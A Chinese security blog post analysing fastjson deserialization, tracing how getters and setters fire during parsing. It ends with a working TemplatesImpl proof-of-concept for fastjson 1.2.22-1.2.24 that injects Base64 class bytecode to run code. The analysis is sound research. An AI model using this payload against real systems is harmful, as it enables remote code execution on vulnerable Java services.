class="toc-number">13.3.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-11"><span class="toc-number">13.3.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-11"><span class="toc-number">13.3.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-67"><span class="toc-number">14.</span> <span class="toc-text">1.2.25-1.2.67</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#igniteJta%E9%93%BE"><span class="toc-number">14.1.</span> <span class="toc-text">igniteJta链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-number">14.1.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-12"><span class="toc-number">14.1.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-12"><span class="toc-number">14.1.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-12"><span class="toc-number">14.1.4.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E9%93%BE-1"><span class="toc-number">14.1.5.</span> <span class="toc-text">shiro链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6"><span class="toc-number">14.1.6.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-13"><span class="toc-number">14.1.7.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-13"><span class="toc-number">14.1.8.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-13"><span class="toc-number">14.1.9.</span> <span class="toc-text">调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-68"><span class="toc-number">15.</span> <span class="toc-text">1.2.25-1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7"><span class="toc-number">15.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-14"><span class="toc-number">15.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-14"><span class="toc-number">15.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-14"><span class="toc-number">15.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-25-1-2-83"><span class="toc-number">16.</span> <span class="toc-text">1.2.25-1.2.83</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8"><span class="toc-number">16.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp-15"><span class="toc-number">16.2.</span> <span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6-15"><span class="toc-number">16.3.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-15"><span class="toc-number">16.4.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">17.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">18.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        fastjson反序列化总结 TODO
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Jasper_sec</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-24T04:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
        
        (Updated: <time datetime="2023-12-25T06:42:40.362Z" class="dt-updated" itemprop="dateModified">2023-12-25</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Fastjson/" rel="tag">Fastjson</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。<br>这个库从2017-2022年，陆陆续续爆出了20多个反序列化RCE。<br>官方采用黑名单的方式修复漏洞，这导致出现一系列的bypass&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698293500707-b0e4f3dc-81e8-4de1-8ff1-e10572a1a178.png" alt="image.png"></p>
<h1 id="序列化分析"><a href="#序列化分析" class="headerlink" title="序列化分析"></a>序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHobby</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobby</span><span class="params">(String hobby)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, properties=&quot;</span> + properties +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="comment">// fastjson 1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Jasper&quot;</span>, <span class="number">22</span>, <span class="string">&quot;fuck some people&quot;</span>);</span><br><span class="line"><span class="comment">//        String s1 = JSON.toJSONString(user);</span></span><br><span class="line"><span class="comment">//        System.out.println(s1);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化后的字符串：&quot;</span>+s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用了getName</span><br><span class="line">序列化后的字符串：&#123;&quot;@type&quot;:&quot;Pojo.User&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;,&quot;name&quot;:&quot;Jasper&quot;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="为什么会调getter"><a href="#为什么会调getter" class="headerlink" title="为什么会调getter"></a>为什么会调getter</h2><p>宏观上理解，为了把对象转JSON，需获取对象的属性值。要么调getter取值，要么反射取值，这里用的前者。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:450, FieldInfo</span><br><span class="line">getPropertyValueDirect:110, FieldSerializer</span><br><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300347029-ae57f17f-9046-4224-9bdb-bac7424c4f31.png" alt="image.png"></p>
<h2 id="构造JSON字符串的地方"><a href="#构造JSON字符串的地方" class="headerlink" title="构造JSON字符串的地方"></a>构造JSON字符串的地方</h2><p>核心在这个try-catch里，上面的调用getter取值也在这里面。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300741065-e554dae6-0de1-450a-ac5e-64eda9222170.png" alt="image.png"></p>
<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Pojo.User\&quot;,\&quot;age\&quot;:22,\&quot;hobby\&quot;:\&quot;fuck some people\&quot;,\&quot;name\&quot;:\&quot;Jasper\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parse-------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s2);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject-----------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parseObject(s2);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject---------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse2</span> <span class="operator">=</span> JSON.parseObject(s2,Object.class);</span><br><span class="line">        System.out.println(parse2);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse2.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">调用了getName</span><br><span class="line">调用了getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jasper&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;&#125;</span><br><span class="line">反序列化对象所属类：com.alibaba.fastjson.JSONObject</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>
<h2 id="1-根据JSON字符串封装deserializer"><a href="#1-根据JSON字符串封装deserializer" class="headerlink" title="1.根据JSON字符串封装deserializer"></a>1.根据JSON字符串封装deserializer</h2><p>宏观上看，此步骤依据一系列规则，选择出可以参与反序列化的field，存进fieldList，放入deserializer。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">build:132, JavaBeanInfo</span><br><span class="line">&lt;init&gt;:39, JavaBeanDeserializer</span><br><span class="line">createJavaBeanDeserializer:586, ParserConfig</span><br><span class="line">getDeserializer:461, ParserConfig</span><br><span class="line">getDeserializer:312, ParserConfig</span><br><span class="line">parseObject:367, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390119436-4d5e6377-6486-4a54-87a9-ffaf6d596238.png" alt="image.png"><br>当函数执行到return，获取到所有符合条件的field，里面有它对应的method，这是后面会调用到的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390350055-073de250-31ec-43c4-9eed-c4adc8364e2c.png" alt="image.png"><br>这里面实际上就有很多分析文章里提到的，getter和setter需要满足的条件。<br>不满足下面这些if判断的method不会add进fieldList，也就不会在下一小节被调用。<br><strong>setter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404119899-9ea4ec6b-bbf4-44c8-8fec-16444eb44d0a.png" alt="image.png"><br><strong>getter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404743852-cea4a5cc-dab9-43d3-b0aa-ff7f23a7f33c.png" alt="image.png"></p>
<h2 id="2-调用deserializer-deserialize创建并初始化对象"><a href="#2-调用deserializer-deserialize创建并初始化对象" class="headerlink" title="2.调用deserializer#deserialize创建并初始化对象"></a>2.调用deserializer#deserialize创建并初始化对象</h2><p><strong>核心逻辑就是，创建一个object变量，然后遍历前面获取的fieldList，对于每个field，调用其getter或者setter或者直接调用native set方法去给field赋值，然后返回object。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:271, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure>
<p>下面的图，给出了不同的field是如何设置属性值的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698418921724-c390b176-b81c-4402-9b3c-574351c6042d.png" alt="image.png"></p>
<h2 id="parse和parseObject的区别"><a href="#parse和parseObject的区别" class="headerlink" title="parse和parseObject的区别"></a>parse和parseObject的区别</h2><p>单参parseObject是parse的封装，在封装的末尾，多了一个JSON.toJSON()，转JSONObject类型的操作。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405744528-716355e9-7545-4a51-889b-f5750dcab5fa.png" alt="image.png"><br>这个操作会调用obj对象的所有getter方法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698405588482-9209f38e-9327-474e-815d-746f019f82f3.png" alt="image.png"><br>而双参parseObecjt则不会调用JSON.toJSON()，从调用getter&#x2F;setter的角度相当于parse函数。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698408678972-84dfc6c8-4cbe-450f-805c-9a3c8c8808e7.png" alt="image.png"><br><strong>总结：单参parseObject先调用一遍parse能调用的setter和getter，然后再调用一遍object所有的getter；</strong><br><strong>双参parseObject在调getter&#x2F;setter方面相当于parse。</strong></p>
<h1 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22-1.2.24"></a>1.2.22-1.2.24</h1><h2 id="TemplatsImpl链"><a href="#TemplatsImpl链" class="headerlink" title="TemplatsImpl链"></a>TemplatsImpl链</h2><p>本质上，就是利用fastjson的任意getter调用去调getOutputProperties，触发CC3后半的链条。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">// fastjson 1.2.22-1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li>要开Feature，挺鸡肋的</li>
</ul>
<h3 id="为什么加-type指定全类名"><a href="#为什么加-type指定全类名" class="headerlink" title="为什么加@type指定全类名"></a>为什么加@type指定全类名</h3><p>不加的话，parse函数不会触发getter和setter</p>
<h3 id="为什么parse要加Feature参数"><a href="#为什么parse要加Feature参数" class="headerlink" title="为什么parse要加Feature参数"></a>为什么parse要加Feature参数</h3><p>Feature.SupportNonPublicField，字面意思要允许给非public字段赋值，CC3这些字段都public的。<br>由此可见这条链其实很鸡肋。</p>
